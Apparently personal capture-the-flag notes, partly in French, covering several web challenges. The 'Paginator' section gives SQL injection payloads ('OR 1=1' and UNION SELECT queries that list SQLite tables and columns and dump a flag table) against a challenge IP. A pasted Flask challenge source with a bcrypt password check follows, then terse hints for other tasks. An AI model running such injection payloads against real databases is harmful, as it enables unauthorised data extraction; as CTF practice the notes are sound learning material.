# Paginator


http://52.59.124.14:5012/?p=2,10

http://52.59.124.14:5012/?p=2,10%20OR%201=1

RU5Pe1NRTDFfVzF0aF8wdVRfQzBtbTRfVzBya3NfU29tZUhvdyF9


http://azfafezfezfezfefqdersg.com/?p=2,10%20OR%201=1

UNION SELECT table_name as title, 1 as id, 'abc' as content FROM information_schema.tables
UNION (SELECT name as title FROM sqlite_master WHERE type='table') JOIN (SELECT 1 as id) as t2 JOIN (SELECT 'abc' as content) as t3

```sql
CREATE TABLE pages (id INTEGER PRIMARY KEY, title TEXT UNIQUE, content TEXT);
INSERT INTO pages (title, content) VALUES ('Page 1', 'This is not a flag, but just a boring page.');
INSERT INTO pages (title, content) VALUES ('Page 2', 'This is not a flag, but just a boring page.');
INSERT INTO pages (title, content) VALUES ('Page 3', 'This is not a flag, but just a boring page.');
INSERT INTO pages (title, content) VALUES ('Page 4', 'This is not a flag, but just a boring page.');
INSERT INTO pages (title, content) VALUES ('Page 5', 'This is not a flag, but just a boring page.');
INSERT INTO pages (title, content) VALUES ('Page 6', 'This is not a flag, but just a boring page.');
INSERT INTO pages (title, content) VALUES ('Page 7', 'This is not a flag, but just a boring page.');
INSERT INTO pages (title, content) VALUES ('Page 8', 'This is not a flag, but just a boring page.');
INSERT INTO pages (title, content) VALUES ('Page 9', 'This is not a flag, but just a boring page.');
INSERT INTO pages (title, content) VALUES ('Page 10', 'This is not a flag, but just a boring page.');
```

Pour le nom des tables :
UNION SELECT * FROM (SELECT name as title FROM sqlite_master WHERE type='table')UT1 JOIN (SELECT 1 as id)UT2 JOIN (SELECT 'abc' as content)UT3

Pour le nom des cols :
UNION SELECT * FROM (SELECT name as title FROM PRAGMA_table_info('flag'))UT1 JOIN (SELECT 1 as id)UT2 JOIN (SELECT 'abc' as content)UT3

Pour le contenu :
UNION SELECT * FROM (SELECT id as id FROM flag)UT1 JOIN (SELECT name as title FROM flag)UT2 JOIN (SELECT value as content FROM flag)UT3

RU5Pe1NRTDFfVzF0aF8wdVRfQzBtbTRfVzBya3NfU29tZUhvd19BZ0Exbl9BbmRfQWc0MW4hfQ==



from flask import Flask, request, redirect, render_template_string
import sys
import os
import bcrypt
import urllib.parse

app = Flask(__name__)
app.secret_key = os.urandom(16); # This is super strong! The password was generated quite securely. Here are the first 70 bytes, since you won't be able to brute-force the rest anyway... 
# >>> strongpw = bcrypt.hashpw(os.urandom(128),bcrypt.gensalt()) 
# >>> strongpw[:71] #b'\xec\x9f\xe0a\x978\xfc\xb6:T\xe2\xa0\xc9<\x9e\x1a\xa5\xfao\xb2\x15\x86\xe5$\x86Z\x1a\xd4\xca#\x15\xd2x\xa0\x0e0\xca\xbc\x89T\xc5V6\xf1\xa4\xa8S\x8a%I\xd8gI\x15\xe9\xe7$M\x15\xdc@\xa9\xa1@\x9c\xeee\xe0\xe0\xf76'
app.ADMIN_PW_HASH = b'$2b$12$8bMrI6D9TMYXeMv8pq8RjemsZg.HekhkQUqLymBic/cRhiKRa3YPK'
FLAG = open("flag.txt").read();

@app.route('/source')
def source():
    return open(__file__).read()
        
@app.route('/', methods=["GET"]) 
def index(): 
    username = request.form.get("username", None)
    password = request.form.get("password", None)
    if username and password:
        username = urllib.parse.unquote_to_bytes(username) 
        password = urllib.parse.unquote_to_bytes(password)
    if username != b"admin":
        return "Wrong user!"
    if len(password) > 128: 
        return "Password too long!"
    if not bcrypt.checkpw(password, app.ADMIN_PW_HASH):
        return "Wrong password!" 
    return f"""Congrats! It appears you have successfully bf'ed the password. Here is your {FLAG}""" # Use f-string formatting within the template string template_string = """


## Profound toughts

https://stylesuxx.github.io/steganography/


## Numberizer

4 char max

5 * 9e99 = overflow

## Crahp

Bruteforce